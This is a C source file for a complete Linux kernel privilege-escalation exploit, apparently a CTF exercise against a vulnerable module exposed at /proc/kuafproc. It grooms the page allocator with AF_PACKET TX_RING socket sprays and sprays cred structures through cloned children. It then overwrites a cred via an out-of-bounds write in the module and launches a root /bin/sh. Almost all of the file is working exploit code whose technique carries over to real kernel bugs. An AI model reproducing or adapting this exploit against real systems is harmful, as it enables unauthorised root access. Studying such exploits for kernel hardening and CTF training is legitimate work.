
// gcc -Os -static -masm=intel exp.c -lutil -o exp
// home/heap/heap_spray/pgv/exp
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PGV_PAGE_NUM 1000
#define PGV_CRED_START (PGV_PAGE_NUM / 2)
#define CRED_SPRAY_NUM 514

#define PACKET_VERSION 10
#define PACKET_TX_RING 13

#define VUL_OBJ_NUM  400
#define VUL_OBJ_SIZE 512
#define VUL_OBJ_PER_SLUB 8
#define VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

// struct castaway_request {
//     int64_t index;
//     size_t	size;
//     void 	*buf;
// };

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct page_request {
    int idx;
    int cmd;
};

enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

struct timespec timer = {
    .tv_sec = 1145141919,
    .tv_nsec = 0,
};

int kuaf_fd;
int cmd_pipe_req[2], cmd_pipe_reply[2], check_root_pipe[2];
char bin_sh_str[] = "/bin/sh";
char *shell_args[] = { bin_sh_str, NULL };
char child_pipe_buf[1];
char root_str[] = "\033[32m\033[1m[+] Successful to get the root.\n"
                  "\033[34m[*] Execve root shell now...\033[0m\n";

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void alloc(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}

// void edit(int64_t index, size_t size, void *buf)
// {
//     struct castaway_request r = {
//         .index = index,
//         .size = size,
//         .buf = buf,
//     };

//     ioctl(kuaf_fd, 0x112233, &r);
// }

void edit(size_t idx, char* buf, size_t size)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}


int waiting_for_root_fn(void *args)
{
    /* 我们对它们使用相同的堆栈，所以需要避免破解它。。 */
    __asm__ volatile (
        "   lea rax, [check_root_pipe]; "
        "   xor rdi, rdi; "
        "   mov edi, dword ptr [rax]; "
        "   mov rsi, child_pipe_buf; "
        "   mov rdx, 1;   "
        "   xor rax, rax; " /* read(check_root_pipe[0], child_pipe_buf, 1)*/
        "   syscall;      "

        "   mov rax, 102; " /* getuid() */
        "   syscall; "

        "   cmp rax, 0; "
        "   jne failed; "
        "   mov rdi, 1; "
        "   lea rsi, [root_str]; "
        "   mov rdx, 80; "
        "   mov rax, 1;"    /* write(1, root_str, 71) */
        "   syscall; "

        "   lea rdi, [bin_sh_str];  "
        "   lea rsi, [shell_args];  "
        "   xor rdx, rdx;   "
        "   mov rax, 59;    "
        "   syscall;        "   /* execve("/bin/sh", args, NULL) */

        "failed: "
        "   lea rdi, [timer]; "
        "   xor rsi, rsi; "
        "   mov rax, 35; "  /* nanosleep() */
        "   syscall; "
    );

    return 0;
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    // 将 PACKET_VERSION 设为 TPACKET_V1
    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
    // 调用 setsockopt() 提交一个 PACKET_TX_RING
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    /* for syscall, it's clone(flags, stack, ...) */
    __asm__ volatile (
        " mov r15, rsi; "   /* save the rsi */
        " xor rsi, rsi; "   /* 将 esp 和无用参数设置为 NULL */
        " xor rdx, rdx; "
        " xor r10, r10; "
        " xor r8, r8;   "
        " xor r9, r9;   "
        " mov rax, 56;  "   /* __NR_clone */
        " syscall;      "

        " cmp rax, 0;   "
        " je child_fn;  "
        " ret;          "   /* parent */
        "child_fn:      "
        " jmp r15;      "   /* child */
    );
}

int alloc_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

int free_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

void spray_cmd_handler(void)
{
    struct page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* 创建隔离命名空间 */
    unshare_setup();

    /* 处理程序请求 */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(0x1000, 1);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

int main(int aragc, char **argv, char **envp)
{
    cpu_set_t cpu_set;
    char th_stack[0x1000], buf[0x1000];

    /* 仅在特定核心上运行exp */
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("FAILED to open kuaf device!");
    }

    /* 使用新的页面堆喷进程 */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    if (!fork()) {
        spray_cmd_handler();
        exit(EXIT_SUCCESS);
    }

    /* 清除伙伴系统的低阶页，从高阶页漂流请求 */
    puts("[*] spraying pgv pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i++) {
        if(alloc_page(i) < 0) {
            printf("[x] failed at no.%d socket\n", i);
            err_exit("FAILED to spray pages via socket!");
        }
    }

    /* cred 的释放页面 */
    puts("[*] freeing for cred pages...");
    for (int i = 1; i < PGV_PAGE_NUM; i += 2){
        free_page(i);
    }

    /* 喷洒 cred 以获取我们之前创建的隔离页面 */
    puts("[*] spraying cred...");
    pipe(check_root_pipe);
    for (int i = 0; i < CRED_SPRAY_NUM; i++) {
        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, 
                         waiting_for_root_fn) < 0){
            printf("[x] failed at cloning %d child\n", i);
            err_exit("FAILED to clone()!");
        }
    }

    /* 可攻击对象的释放页面 */
    puts("[*] freeing for vulnerable pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i += 2){
        free_page(i);
    }

    /* 喷洒易受攻击的对象，希望我们能制造一个 oob-write cred */
    puts("[*] trigerring vulnerability in castaway kernel module...");
    memset(buf, '\0', 0x1000);
    *(uint32_t*) &buf[VUL_OBJ_SIZE - 6] = 1;    /* cred->usage */
    for (int i = 0; i < VUL_OBJ_NUM; i++) {
        alloc(i);
        edit(i, buf, VUL_OBJ_SIZE);
    }

    /* 检查子进程中的权限 */
    puts("[*] notifying child processes and waiting...");
    write(check_root_pipe[1], buf, CRED_SPRAY_NUM);
    sleep(1145141919);

    return 0;
}


